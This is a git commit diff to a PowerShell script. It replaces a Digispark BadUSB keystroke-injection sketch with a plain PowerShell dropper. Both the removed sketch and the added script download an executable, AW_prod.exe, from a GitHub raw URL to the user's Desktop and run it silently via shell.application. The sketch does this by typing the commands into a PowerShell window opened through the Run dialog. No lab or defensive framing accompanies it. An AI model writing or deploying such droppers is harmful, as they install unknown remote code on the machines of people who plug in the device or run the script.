2ee2ef00492460163b8d19f0674fe52d015020ac
alaminkhanakib <76173418+alaminkhanakib@users.noreply.github.com>
2021-11-03 18:34:16 +0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,30 +1,7 @@
-#include "DigiKeyboard.h"
-
-void setup() {
-
-}
-
-void loop()
-{
-    DigiKeyboard.sendKeyStroke(0);
-    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-    DigiKeyboard.delay(500);
-    DigiKeyboard.println("powershell.exe");
-    DigiKeyboard.delay(500);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    DigiKeyboard.delay(2000);
-    DigiKeyboard.println("[Net.ServicePointManager]::SecurityProtocol =");
-    DigiKeyboard.println("[Net.SecurityProtocolType]::Tls12");
-    DigiKeyboard.println("$down = New-Object System.Net.WebClient");
-    DigiKeyboard.println("$url = \"https://github.com/alaminkhanakib/testing-/blob/main/AW_prod.exe?raw=true\"");
-    DigiKeyboard.println("$file = \"$($env:USERPROFILE)/Desktop/AW_prod.exe\"");
-    DigiKeyboard.println("$down.DownloadFile($url,$file)");
-    DigiKeyboard.delay(1000);
-    DigiKeyboard.println("$exec = New-Object -com shell.application");
-    DigiKeyboard.println("$exec.shellexecute($file)");
-    DigiKeyboard.delay(5000);
-    DigiKeyboard.println("exit");
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-    digitalWrite(1, LOW);
-    DigiKeyboard.delay(90000000);
-}
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$down = New-Object System.Net.WebClient
+$url = 'https://github.com/alaminkhanakib/testing-/blob/main/AW_prod.exe?raw=true'
+$file = "$($env:USERPROFILE)\Desktop\AW_prod.exe"
+$down.DownloadFile($url,$file)
+$exec = New-Object -com shell.application
+$exec.shellexecute($file)
